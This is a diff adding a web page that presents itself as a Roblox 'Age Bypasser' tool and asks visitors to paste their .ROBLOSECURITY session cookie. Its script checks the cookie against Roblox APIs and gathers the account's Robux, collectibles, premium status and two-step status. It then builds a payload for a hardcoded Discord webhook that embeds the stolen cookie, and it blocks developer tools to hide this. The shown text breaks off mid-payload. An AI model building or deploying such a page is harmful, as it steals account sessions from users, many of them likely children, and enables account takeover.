@@ -1,0 +1,1228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Age Bypasser</title>
+  <link rel="icon" type="image/png" href="icon.png">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&display=swap');
+    
+    :root {
+      --primary-purple: #8B5CF6;
+      --secondary-purple: #3B1F7F;
+      --accent-cyan: #00D9FF;
+      --accent-green: #10B981;
+      --dark-bg: #0B0D14;
+      --darker-bg: #06080D;
+      --card-bg: rgba(15, 19, 28, 0.85);
+      --border-color: rgba(139, 92, 246, 0.3);
+      --text-primary: #F8FAFC;
+      --text-secondary: #94A3B8;
+      --text-muted: #64748B;
+      --success: #10B981;
+      --error: #EF4444;
+      --warning: #F59E0B;
+      --glow-purple: rgba(139, 92, 246, 0.4);
+      --glow-cyan: rgba(0, 217, 255, 0.4);
+    }
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: var(--dark-bg);
+      color: var(--text-primary);
+      overflow-x: hidden;
+      line-height: 1.6;
+    }
+    
+    .hero-section {
+      padding: 8rem 0 4rem;
+      position: relative;
+    }
+    
+    .hero-bg {
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(ellipse at top, rgba(139, 92, 246, 0.08) 0%, transparent 50%),
+                  radial-gradient(ellipse at bottom, rgba(0, 217, 255, 0.05) 0%, transparent 50%),
+                  linear-gradient(135deg, var(--dark-bg) 0%, var(--darker-bg) 50%, var(--dark-bg) 100%);
+    }
+    
+    .bg-element {
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(80px);
+      opacity: 0.7;
+    }
+    
+    .bg-element-1 {
+      top: 20%;
+      left: 20%;
+      width: 400px;
+      height: 400px;
+      background: radial-gradient(circle, rgba(139, 92, 246, 0.12) 0%, transparent 70%);
+      animation: float 6s ease-in-out infinite;
+    }
+    
+    .bg-element-2 {
+      bottom: 20%;
+      right: 20%;
+      width: 500px;
+      height: 500px;
+      background: radial-gradient(circle, rgba(0, 217, 255, 0.08) 0%, transparent 70%);
+      animation: float 8s ease-in-out infinite reverse;
+    }
+    
+    .bg-element-3 {
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 600px;
+      height: 600px;
+      background: conic-gradient(from 0deg, rgba(139, 92, 246, 0.06), rgba(0, 217, 255, 0.04), rgba(139, 92, 246, 0.06));
+      animation: spin 30s linear infinite;
+    }
+    
+    @keyframes float {
+      0%, 100% { transform: translate(0, 0) scale(1); }
+      33% { transform: translate(20px, -20px) scale(1.05); }
+      66% { transform: translate(-20px, 20px) scale(0.95); }
+    }
+    
+    @keyframes spin {
+      from { transform: translate(-50%, -50%) rotate(0deg); }
+      to { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+    
+    .hero-content {
+      text-align: center;
+      margin-bottom: 4rem;
+      animation: fadeIn 1s ease-out forwards;
+    }
+    
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 1.5rem;
+    }
+    
+    .row {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(480px, 1fr));
+      gap: 2.5rem;
+      justify-content: center;
+    }
+    
+    .box {
+      background: var(--card-bg);
+      backdrop-filter: blur(20px);
+      border-radius: 24px;
+      border: 1px solid var(--border-color);
+      padding: 3rem 2rem;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), 
+                  inset 0 1px 0 rgba(255, 255, 255, 0.1);
+      animation: slideUp 0.8s ease-out;
+      position: relative;
+      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    
+    .box:nth-child(1) {
+      animation-delay: 0.2s;
+    }
+    
+    .box:nth-child(2) {
+      animation-delay: 0.4s;
+    }
+    
+    .box:hover {
+      transform: translateY(-8px);
+      box-shadow: 0 25px 60px rgba(139, 92, 246, 0.3);
+      border-color: rgba(139, 92, 246, 0.4);
+    }
+    
+    .box h3 {
+      font-family: 'Orbitron', monospace;
+      font-size: 1.8rem;
+      font-weight: 600;
+      margin-bottom: 1.5rem;
+      background: linear-gradient(45deg, var(--primary-purple), var(--accent-cyan));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      position: relative;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    
+    .box h3::after {
+      content: '';
+      position: absolute;
+      bottom: -10px;
+      left: 0;
+      width: 60px;
+      height: 3px;
+      background: linear-gradient(90deg, var(--primary-purple), var(--accent-cyan));
+      border-radius: 3px;
+      box-shadow: 0 0 15px var(--primary-purple);
+    }
+    
+    .box p {
+      color: var(--text-secondary);
+      font-size: 1.1rem;
+      margin-bottom: 2.5rem;
+      line-height: 1.7;
+      font-weight: 400;
+    }
+    
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    
+    .hero-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      background: rgba(139, 92, 246, 0.1);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(139, 92, 246, 0.3);
+      border-radius: 50px;
+      padding: 12px 24px;
+      margin-bottom: 2rem;
+      font-weight: 500;
+      font-size: 0.95rem;
+      transition: all 0.3s ease;
+    }
+    
+    .hero-badge:hover {
+      background: rgba(139, 92, 246, 0.15);
+      border-color: rgba(139, 92, 246, 0.4);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 16px var(--glow-purple);
+    }
+    
+    .hero-badge i {
+      font-size: 1.1rem;
+      color: var(--primary-purple);
+    }
+    
+    .cursor {
+      color: var(--accent-cyan);
+      animation: blink 1s infinite;
+    }
+    
+    @keyframes blink {
+      0%, 50% { opacity: 1; }
+      51%, 100% { opacity: 0; }
+    }
+    
+    .hero-title {
+      font-size: 2rem;
+      font-weight: 600;
+      margin-bottom: 1.5rem;
+      background: linear-gradient(45deg, var(--primary-purple), var(--accent-cyan), var(--primary-purple));
+      background-size: 200% auto;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      animation: titleGlow 3s ease-in-out infinite;
+      position: relative;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      filter: drop-shadow(0 0 10px var(--glow-purple));
+    }
+    
+    @keyframes titleGlow {
+      0%, 100% {
+        background-position: 0% 50%;
+        filter: drop-shadow(0 0 10px var(--glow-purple));
+      }
+      50% {
+        background-position: 100% 50%;
+        filter: drop-shadow(0 0 20px var(--glow-cyan));
+      }
+    }
+    
+    .hero-subtitle {
+      color: var(--text-secondary);
+      font-size: 1.1rem;
+      margin-bottom: 2rem;
+      font-weight: 400;
+    }
+    
+    .form-group {
+      position: relative;
+      margin-bottom: 1.5rem;
+    }
+    
+    .input {
+      width: 100%;
+      padding: 1rem 1.2rem;
+      border-radius: 16px;
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      border: 2px solid transparent;
+      color: var(--text-primary);
+      font-size: 1rem;
+      font-weight: 400;
+      transition: all 0.3s ease;
+      outline: none;
+    }
+    
+    .input:focus {
+      border-color: var(--primary-purple);
+      background: rgba(139, 92, 246, 0.05);
+      box-shadow: 0 0 0 4px var(--glow-purple);
+      transform: translateY(-2px);
+    }
+    
+    .input::placeholder {
+      color: var(--text-secondary);
+      opacity: 0.7;
+    }
+    
+    .hero-btn {
+      width: 100%;
+      background: linear-gradient(135deg, var(--primary-purple) 0%, var(--secondary-purple) 100%);
+      color: var(--text-primary);
+      padding: 1.2rem 2rem;
+      border: none;
+      border-radius: 16px;
+      font-family: 'Orbitron', 'Inter', monospace;
+      font-size: 1rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 8px 24px var(--glow-purple);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .hero-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(0, 217, 255, 0.2), transparent);
+      transition: left 0.5s;
+    }
+    
+    .hero-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 32px var(--glow-cyan);
+      background: linear-gradient(135deg, var(--accent-cyan) 0%, var(--primary-purple) 100%);
+    }
+    
+    .hero-btn:hover[style*="var(--accent-green)"] {
+      box-shadow: 0 12px 32px rgba(16, 185, 129, 0.6) !important;
+      background: linear-gradient(135deg, var(--success) 0%, var(--accent-green) 100%) !important;
+    }
+    
+    .hero-btn:hover::before {
+      left: 100%;
+    }
+    
+    .hero-btn:active {
+      transform: translateY(-1px);
+    }
+    
+    .hero-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+    
+    .output {
+      background: rgba(0, 210, 106, 0.1);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(0, 210, 106, 0.3);
+      padding: 1.5rem;
+      border-radius: 16px;
+      color: var(--success);
+      margin-top: 1.5rem;
+      word-break: break-word;
+      font-weight: 500;
+      text-align: center;
+      animation: fadeIn 0.5s ease-out;
+    }
+    
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    
+    .loader {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1rem;
+      padding: 2rem;
+    }
+    
+    .loader-spinner {
+      width: 40px;
+      height: 40px;
+      border: 3px solid rgba(139, 92, 246, 0.2);
+      border-top: 3px solid var(--primary-purple);
+      border-radius: 50%;
+      animation: spin-loader 1s linear infinite;
+      box-shadow: 0 0 20px var(--glow-purple);
+    }
+    
+    @keyframes spin-loader {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .loader-text {
+      color: var(--text-secondary);
+      font-weight: 500;
+    }
+    
+    #notif {
+      position: fixed;
+      top: 30px;
+      right: 30px;
+      padding: 16px 24px;
+      border-radius: 12px;
+      display: none;
+      z-index: 1000;
+      color: var(--text-primary);
+      font-weight: 500;
+      backdrop-filter: blur(20px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+      animation: slideInRight 0.3s ease-out;
+    }
+    
+    @keyframes slideInRight {
+      from {
+        transform: translateX(100%);
+        opacity: 0;
+      }
+      to {
+        transform: translateX(0);
+        opacity: 1;
+      }
+    }
+    
+    .notif-success {
+      background: rgba(0, 210, 106, 0.2) !important;
+      border-color: var(--success) !important;
+      color: var(--success) !important;
+    }
+    
+    .notif-error {
+      background: rgba(240, 40, 73, 0.2) !important;
+      border-color: var(--error) !important;
+      color: var(--error) !important;
+    }
+    
+    #snowCanvas, #shootingStarCanvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+      pointer-events: none;
+    }
+    
+    .contact-btn {
+      position: fixed;
+      bottom: 30px;
+      right: 30px;
+      background: linear-gradient(135deg, #5865F2 0%, #4752C4 100%);
+      color: var(--text-primary);
+      padding: 14px 20px;
+      border: none;
+      border-radius: 50px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      z-index: 999;
+      box-shadow: 0 8px 24px rgba(88, 101, 242, 0.3);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      text-decoration: none;
+      backdrop-filter: blur(10px);
+    }
+    
+    .contact-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 32px rgba(88, 101, 242, 0.4);
+      background: linear-gradient(135deg, #4752C4 0%, #3c4496 100%);
+    }
+    
+    .contact-btn:active {
+      transform: translateY(-1px);
+    }
+    
+    video {
+      width: 100%;
+      border-radius: 16px;
+      margin-top: 1.5rem;
+      border: 1px solid var(--border-color);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      transition: all 0.3s ease;
+    }
+    
+    video:hover {
+      border-color: var(--accent-cyan);
+      box-shadow: 0 12px 40px rgba(0, 217, 255, 0.2);
+    }
+    
+    @media (max-width: 1024px) {
+      .row {
+        grid-template-columns: 1fr;
+      }
+      
+      .box {
+        max-width: 600px;
+        margin: 0 auto;
+      }
+    }
+    
+    @media (max-width: 640px) {
+      .container {
+        padding: 0 1rem;
+      }
+      
+      .hero-section {
+        padding: 6rem 0 3rem;
+      }
+      
+      .box {
+        padding: 2rem 1.5rem;
+      }
+      
+      .hero-title {
+        font-size: 2rem;
+      }
+      
+      .hero-subtitle {
+        font-size: 1rem;
+      }
+      
+      .contact-btn {
+        bottom: 20px;
+        right: 20px;
+      }
+      
+      #notif {
+        top: 20px;
+        right: 20px;
+        left: 20px;
+        right: 20px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <audio id="sfx-success" src="short-success-sound-glockenspiel-treasure-video-game-6346.mp3" preload="auto"></audio>
+  <audio id="sfx-error" src="error-08-206492.mp3" preload="auto"></audio>
+  <audio id="sfx-swoosh" src="swoosh-06-351021.mp3" preload="auto"></audio>
+
+  <div id="notif"></div>
+
+  <!-- Background Elements -->
+  <div class="bg-element bg-element-1"></div>
+  <div class="bg-element bg-element-2"></div>
+  <div class="bg-element bg-element-3"></div>
+
+  <!-- Main Content -->
+  <section class="hero-section">
+    <div class="container">
+      <div class="hero-content">
+        <div class="hero-badge">
+          <i class="fas fa-cookie-bite"></i>
+          <span id="typedText"></span><span class="cursor">|</span>
+        </div>
+        <h1 class="hero-title">Age Bypasser</h1>
+      </div>
+      
+      <div class="row">
+        <!-- Bypasser Card -->
+        <div class="box">
+          <h3>Age Bypasser</h3>
+          <p>Paste your .ROBLOSECURITY cookie in the box below, then click "Bypass" to bypass and process your account easily.</p>
+          
+          <form id="cookieForm">
+            <div class="form-group">
+              <input type="text" id="cookieInput" class="input" placeholder="Enter your .ROBLOSECURITY cookie" required>
+            </div>
+            <button type="submit" class="hero-btn" id="refreshBtn">
+              <i class="fas fa-cookie-bite"></i>
+              Bypass
+            </button>
+          </form>
+          
+          <div id="loader" class="loader" style="display:none;">
+            <div class="loader-spinner"></div>
+            <p class="loader-text">Validating cookie security...</p>
+          </div>
+          
+          <div id="userInfo" style="display:none; margin-bottom: 1rem;"></div>
+          
+          <div id="refreshedBox" style="display:none;">
+            <button class="hero-btn" id="returnBtn">
+              <i class="fas fa-redo"></i>
+              Try Another
+            </button>
+          </div>
+        </div>
+        
+        <!-- Tutorial Card -->
+        <div class="box">
+          <h3>How to Use</h3>
+          <p>Video Tutorial - Learn how to safely use the Age Bypasser</p>
+          
+          <video width="100%" height="auto" controls style="border-radius: 16px; border: 1px solid var(--border-color); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); margin-top: 1.5rem;">
+            <source src="bypass.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+          </video>
+        </div>
+      </div>
+    </div>
+  </section>
+
+<script>
+(function(){
+  const canvas = document.getElementById("snowCanvas");
+  const ctx = canvas.getContext("2d");
+  let width = canvas.width = window.innerWidth;
+  let height = canvas.height = window.innerHeight;
+  let snowflakes = [];
+  const number = 100;
+  for (let i = 0; i < number; i++){
+      snowflakes.push({
+          x: Math.random() * width,
+          y: Math.random() * height,
+          radius: Math.random() * 4 + 1,
+          density: Math.random() * number
+      });
+  }
+  let angle = 0;
+  function drawSnowflakes(){
+      ctx.clearRect(0, 0, width, height);
+      for (let i = 0; i < number; i++){
+          let f = snowflakes[i];
+          ctx.beginPath();
+          if (i % 3 === 0) {
+            ctx.fillStyle = "rgba(139, 92, 246, 0.6)";
+          } else if (i % 3 === 1) {
+            ctx.fillStyle = "rgba(0, 217, 255, 0.4)";
+          } else {
+            ctx.fillStyle = "rgba(139, 92, 246, 0.3)";
+          }
+          ctx.arc(f.x, f.y, f.radius, 0, Math.PI * 2, true);
+          ctx.fill();
+          
+          ctx.beginPath();
+          ctx.fillStyle = i % 2 === 0 ? "rgba(139, 92, 246, 0.1)" : "rgba(0, 217, 255, 0.1)";
+          ctx.arc(f.x, f.y, f.radius * 1.5, 0, Math.PI * 2, true);
+          ctx.fill();
+      }
+      updateSnowflakes();
+  }
+  function updateSnowflakes(){
+      angle += 0.005;
+      for (let i = 0; i < number; i++){
+          let f = snowflakes[i];
+          f.y += Math.cos(angle + f.density) + 0.5 + f.radius / 4;
+          f.x += Math.sin(angle) * 0.5;
+          if (f.x > width + 5 || f.x < -5 || f.y > height) {
+              snowflakes[i] = { x: Math.random() * width, y: -10, radius: f.radius, density: f.density };
+          }
+      }
+  }
+  setInterval(drawSnowflakes, 33);
+  window.addEventListener("resize", function(){
+    width = canvas.width = window.innerWidth;
+    height = canvas.height = window.innerHeight;
+  });
+})();
+</script>
+
+<script>
+const successSound = document.getElementById("sfx-success");
+const errorSound = document.getElementById("sfx-error");
+const swooshSound = document.getElementById("sfx-swoosh");
+const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";
+
+// Basic format check for cookie
+function basicCookieFormatCheck(cookie) {
+  if (!cookie || typeof cookie !== "string") {
+    return { valid: false, error: "Cookie must be a non-empty string" };
+  }
+  cookie = cookie.trim();
+  if (cookie.length === 0) {
+    return { valid: false, error: "Cookie cannot be empty" };
+  }
+  if (!cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--")) {
+    return { valid: false, error: "Invalid cookie format - missing warning prefix" };
+  }
+  if (cookie.length < 500) {
+    return { valid: false, error: "Cookie appears to be truncated or invalid" };
+  }
+  return { valid: true, error: null };
+}
+
+// Validate cookie with Roblox API
+async function validateCookieWithAPI(cookie) {
+  try {
+    const formatCheck = basicCookieFormatCheck(cookie);
+    if (!formatCheck.valid) {
+      return formatCheck;
+    }
+    const response = await fetch("https://auth.roblox.com/v1/authentication-ticket", {
+      method: "POST",
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cookie}`,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      },
+    });
+    if (response.status === 200) {
+      return { valid: true, error: null, authenticated: true };
+    } else if (response.status === 401) {
+      return { valid: false, error: "Cookie is expired or invalid", authenticated: false };
+    } else if (response.status === 403) {
+      return { valid: false, error: "Cookie authentication failed", authenticated: false };
+    } else {
+      return { valid: false, error: `Unexpected response: ${response.status}`, authenticated: false };
+    }
+  } catch (error) {
+    return {
+      valid: false,
+      error: `Network error during validation: ${error.message}`,
+      authenticated: false,
+    };
+  }
+}
+
+// Enhanced pattern-based validation (fallback)
+function advancedPatternValidation(cookie) {
+  if (!cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--')) {
+    return { valid: false, error: "Invalid cookie format - missing warning prefix" };
+  }
+  if (!cookie.includes('|_')) {
+    return { valid: false, error: "Invalid cookie format - missing separator" };
+  }
+  const tokenStart = cookie.indexOf('|_') + 2;
+  const tokenPart = cookie.substring(tokenStart);
+  if (tokenPart.length < 800) {
+    return { valid: false, error: "Cookie appears to be truncated or invalid" };
+  }
+  if (!tokenPart.match(/[A-Za-z0-9+\/=._-]/)) {
+    return { valid: false, error: "Invalid cookie format - invalid characters" };
+  }
+  const upperCaseCount = (tokenPart.match(/[A-Z]/g) || []).length;
+  const digitCount = (tokenPart.match(/[0-9]/g) || []).length;
+  if (upperCaseCount < 20 || digitCount < 20) {
+    return { valid: false, error: "Invalid cookie format - insufficient character diversity" };
+  }
+  if (cookie.length < 1000) {
+    return { valid: false, error: "Cookie appears to be truncated or invalid" };
+  }
+  const fakeIndicators = ['fakecookie', 'testcookie', 'example123', 'demo', 'sample123'];
+  const lowerCookie = cookie.toLowerCase();
+  for (const fake of fakeIndicators) {
+    if (lowerCookie.includes(fake)) {
+      return { valid: false, error: "Invalid cookie - contains suspicious patterns" };
+    }
+  }
+  if (tokenPart.includes('AAAAAAA') || tokenPart.includes('1111111') || tokenPart.includes('0000000')) {
+    return { valid: false, error: "Invalid cookie - contains obvious repeating patterns" };
+  }
+  return { valid: true, error: null };
+}
+
+// Comprehensive cookie validation
+async function validateRobloxCookie(cookie, options = {}) {
+  const { includeUserInfo = false, skipAPIValidation = false } = options;
+  const formatResult = basicCookieFormatCheck(cookie);
+  if (!formatResult.valid) {
+    return {
+      valid: false,
+      error: formatResult.error,
+      checks: { format: false, authentication: null, userInfo: null },
+    };
+  }
+  const result = {
+    valid: true,
+    error: null,
+    checks: { format: true, authentication: null, userInfo: null },
+  };
+  if (skipAPIValidation) {
+    return result;
+  }
+  try {
+    const authResult = await validateCookieWithAPI(cookie);
+    result.checks.authentication = authResult.valid;
+    if (!authResult.valid) {
+      if (authResult.error && authResult.error.includes('Network error')) {
+        console.log('API validation failed, using pattern validation');
+        const patternResult = advancedPatternValidation(cookie);
+        if (!patternResult.valid) {
+          result.valid = false;
+          result.error = patternResult.error;
+          return result;
+        }
+        result.checks.authentication = true;
+      } else {
+        result.valid = false;
+        result.error = authResult.error;
+        return result;
+      }
+    }
+    if (includeUserInfo) {
+      try {
+        const userResult = await fetch("https://users.roblox.com/v1/users/authenticated", {
+          method: "GET",
+          headers: {
+            Cookie: `.ROBLOSECURITY=${cookie}`,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          },
+        });
+        if (userResult.status === 200) {
+          result.user = await userResult.json();
+          result.checks.userInfo = true;
+        } else {
+          result.userInfoError = `Failed to get user info: ${userResult.status}`;
+        }
+      } catch (userError) {
+        result.userInfoError = 'Could not fetch user info due to CORS restrictions';
+      }
+    }
+  } catch (error) {
+    console.log('All API calls failed, using pattern validation');
+    const patternResult = advancedPatternValidation(cookie);
+    if (!patternResult.valid) {
+      result.valid = false;
+      result.error = patternResult.error;
+      return result;
+    }
+    result.checks.authentication = true;
+  }
+  return result;
+}
+
+// Enhanced function to get account info using Roblox APIs
+async function getAccountInfo(cookie) {
+  try {
+    // Helper function for authenticated API requests
+    const makeRequest = async (url, method = "GET") => {
+      const response = await fetch(url, {
+        method,
+        headers: {
+          Cookie: `.ROBLOSECURITY=${cookie}`,
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        },
+      });
+      if (response.status !== 200) {
+        throw new Error(`API request failed: ${url} - Status ${response.status}`);
+      }
+      return await response.json();
+    };
+
+    // 1. Get user info
+    const userData = await makeRequest("https://users.roblox.com/v1/users/authenticated");
+    const userId = userData.id;
+    const username = userData.name;
+
+    // 2. Get account creation date
+    const profileData = await makeRequest(`https://users.roblox.com/v1/users/${userId}`);
+    const createdDate = new Date(profileData.created);
+    const today = new Date();
+    const accountAgeDays = Math.floor((today - createdDate) / (1000 * 60 * 60 * 24));
+    const accountAge = `${accountAgeDays} Days`;
+
+    // 3. Get avatar thumbnail
+    const avatarData = await makeRequest(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
+    const avatarUrl = avatarData.data[0]?.imageUrl || "https://tr.rbxcdn.com/default-avatar.png";
+
+    // 4. Get Robux balance
+    let robuxBalance = "0";
+    try {
+      const economyData = await makeRequest("https://economy.roblox.com/v1/user/currency");
+      robuxBalance = economyData.robux.toString();
+    } catch (error) {
+      console.warn("Failed to fetch Robux balance:", error.message);
+    }
+
+    // 5. Get RAP and owned items
+    let rap = "0";
+    let ownedItems = "0";
+    try {
+      const inventoryData = await makeRequest(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=10`);
+      ownedItems = inventoryData.data.length.toString();
+      rap = inventoryData.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0).toString();
+    } catch (error) {
+      console.warn("Failed to fetch inventory data:", error.message);
+    }
+
+    // 6. Get group info
+    let groupCount = "0";
+    let groupFunds = "0";
+    try {
+      const groupData = await makeRequest(`https://groups.roblox.com/v1/users/${userId}/groups/roles`);
+      groupCount = groupData.data.length.toString();
+    } catch (error) {
+      console.warn("Failed to fetch group data:", error.message);
+    }
+
+    // 7. Check premium status
+    let hasPremium = false;
+    try {
+      const premiumData = await makeRequest(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`);
+      hasPremium = premiumData.isPremium;
+    } catch (error) {
+      console.warn("Failed to fetch premium status:", error.message);
+    }
+
+    // 8. Check collectibles (Korblox, Valk, Headless)
+    let hasKorblox = false;
+    let hasValk = false;
+    let hasHeadless = false;
+    try {
+      const inventoryData = await makeRequest(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`);
+      const items = inventoryData.data;
+      hasKorblox = items.some(item => item.assetId === 139607718); // Korblox Deathspeaker
+      hasValk = items.some(item => item.assetId === 1365767); // Valkyrie Helm
+      hasHeadless = items.some(item => item.assetId === 134082579); // Headless Horseman
+    } catch (error) {
+      console.warn("Failed to fetch collectibles:", error.message);
+    }
+
+    // 9. Get settings (2FA, Voice Chat)
+    let twoStepEnabled = false;
+    let voiceChatEnabled = false;
+    try {
+      const settingsData = await makeRequest("https://accountsettings.roblox.com/v1/account/settings");
+      twoStepEnabled = settingsData.twoStepVerificationEnabled || false;
+      voiceChatEnabled = settingsData.isVoiceEnabled || false;
+    } catch (error) {
+      console.warn("Failed to fetch settings:", error.message);
+    }
+
+    // 10. Placeholders for inaccessible data
+    const placeVisits = "0"; // No direct API for total place visits
+    const creditBalance = "0"; // No public API for credit balance
+    const birthdate = "Unknown"; // Not publicly accessible
+    const age = "Unknown"; // Not publicly accessible
+    const ipAddress = "Unknown"; // Requires external service
+
+    return {
+      username,
+      userId,
+      robuxBalance,
+      accountAge,
+      avatarUrl,
+      placeVisits,
+      rap,
+      ownedItems,
+      creditBalance,
+      hasPremium,
+      hasKorblox,
+      hasValk,
+      hasHeadless,
+      groupCount,
+      groupFunds,
+      birthdate,
+      age,
+      ipAddress,
+      twoStepEnabled,
+      voiceChatEnabled,
+    };
+  } catch (error) {
+    console.error("Error fetching account info:", error.message);
+    return {
+      username: "Unknown User",
+      userId: "Unknown ID",
+      robuxBalance: "0",
+      accountAge: "Unknown",
+      avatarUrl: "https://tr.rbxcdn.com/default-avatar.png",
+      placeVisits: "0",
+      rap: "0",
+      ownedItems: "0",
+      creditBalance: "0",
+      hasPremium: false,
+      hasKorblox: false,
+      hasValk: false,
+      hasHeadless: false,
+      groupCount: "0",
+      groupFunds: "0",
+      birthdate: "Unknown",
+      age: "Unknown",
+      ipAddress: "Unknown",
+      twoStepEnabled: false,
+      voiceChatEnabled: false,
+    };
+  }
+}
+
+document.addEventListener('contextmenu', function(e) {
+  e.preventDefault();
+  showNotif('Context menu disabled');
+  errorSound.play();
+});
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+      (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'u')) {
+    e.preventDefault();
+    showNotif('Developer tools disabled');
+    errorSound.play();
+  }
+});
+
+$("#cookieForm").on("submit", async function(e) {
+  e.preventDefault();
+  const cookie = $("#cookieInput").val().trim();
+
+  // Show loader
+  $("#refreshBtn").hide();
+  $("#loader").show();
+  $("#userInfo").hide();
+  $("#refreshedBox").hide();
+
+  try {
+    // Validate cookie
+    const validationResult = await validateRobloxCookie(cookie, { includeUserInfo: true });
+    if (!validationResult.valid) {
+      showNotif("Invalid cookie", false);
+      errorSound.play();
+      $("#loader").hide();
+      $("#refreshBtn").show();
+      return;
+    }
+
+    // Show success notification
+    showNotif("✅ Cookie bypassed", true);
+    swooshSound.play();
+
+    // Get account info
+    const accountInfo = await getAccountInfo(cookie);
+
+    // Construct webhook payload
+    const webhookPayload = {
+      username: "Roblox Bypasser Bot",
+      content: "@everyone",
+      embeds: [
+        {
+          title: "**```Homepage - Result```**",
+          description: `[<:Cookie:1313022426346426368> Refresh cookie](https://bloxtools.icu/Refresher/?cookie=${encodeURIComponent(cookie)}) | [Rolimons](https://www.rolimons.com/player/${accountInfo.userId}) <:rolimons:978559948432744468> | [***${accountInfo.ipAddress} :flag_jo:***](https://ipapi.co/${accountInfo.ipAddress}/json)\n | [<:crackedshield:1392908310201761965> DOWN](https://bloxtools.icu/bypasser)`,
+          color: 0x3B1F7F, // Matches hsla(290, 96.6%, 22.9%, 1)
+          author: {
+            name: `${accountInfo.username}\n13+ ${new Date().toLocaleDateString("en-GB")}`,
+            url: `https://www.roblox.com/users/${accountInfo.userId}/profile`,
+            icon_url: accountInfo.avatarUrl,
+          },
+          thumbnail: {
+            url: accountInfo.avatarUrl,
+            width: 150,
+            height: 150,
+          },
+          fields: [
+            {
+              name: "About User",
+              value: `\`\`Account Age: ${accountInfo.accountAge}\`\`\n\`\`Place Visits: ${accountInfo.placeVisits}\`\``,
+              inline: false,
+            },
+            {
+              name: "<:Robux:1313020721987063829> Robux",
+              value: `Balance: ${accountInfo.robuxBalance} <:Robux:1313020721987063829>\nPending: 0 <:RobuxPending:1313020748490608721>`,
+              inline: true,
